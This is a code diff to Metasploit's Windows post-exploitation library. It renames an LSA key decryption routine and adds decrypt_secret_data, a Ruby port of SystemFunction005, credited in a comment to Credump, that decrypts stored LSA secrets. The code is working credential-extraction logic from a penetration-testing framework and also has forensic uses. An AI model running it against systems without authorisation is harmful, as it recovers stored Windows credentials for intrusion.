@@ -175,7 +175,7 @@ module Msf::Post::Windows::Priv
     end
 
     if( @vista == 1 )
-      lsakey = decrypt_lsa(pol, bootkey)
+      lsakey = decrypt_lsa_data(pol, bootkey)
       lsakey = lsakey[68,32]
       vprint_good(lsakey.unpack("H*")[0])
     else
@@ -195,9 +195,9 @@ module Msf::Post::Windows::Priv
   end
 
   #
-  # Decrypts the LSA key
+  # Decrypts the LSA encrypted data
   #
-  def decrypt_lsa(pol, encryptedkey)
+  def decrypt_lsa_data(pol, encryptedkey)
 
     sha256x = Digest::SHA256.new()
     sha256x << encryptedkey
@@ -210,17 +210,48 @@ module Msf::Post::Windows::Priv
 
     vprint_status("digest #{sha256x.digest.unpack("H*")[0]}")
 
-    decryptedkey = ''
+    decrypted_data = ''
 
     for i in (60...pol.length).step(16)
       aes.decrypt
       aes.padding = 0
       xx = aes.update(pol[i...i+16])
-      decryptedkey += xx
+      decrypted_data += xx
     end
-    vprint_good("Dec_Key #{decryptedkey}")
+    vprint_good("Dec_Key #{decrypted_data}")
 
-    return decryptedkey
+    return decrypted_data
+  end
+
+  # Decrypts "Secret" encrypted data
+  # Ruby implementation of SystemFunction005
+  # the original python code has been taken from Credump
+  #
+  def decrypt_secret_data(secret, key)
+
+    j = 0
+    decrypted_data = ''
+
+    for i in (0...secret.length).step(8)
+      enc_block = secret[i..i+7]
+      block_key = key[j..j+6]
+      des_key = convert_des_56_to_64(block_key)
+      d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
+
+      d1.padding = 0
+      d1.key = des_key
+      d1o = d1.update(enc_block)
+      d1o << d1.final
+      decrypted_data += d1o
+      j += 7
+      if (key[j..j+7].length < 7 )
+        j = key[j..j+7].length
+      end
+    end
+    dec_data_len = decrypted_data[0].ord
+
+    return decrypted_data[8..8+dec_data_len]
+
   end
 
 end
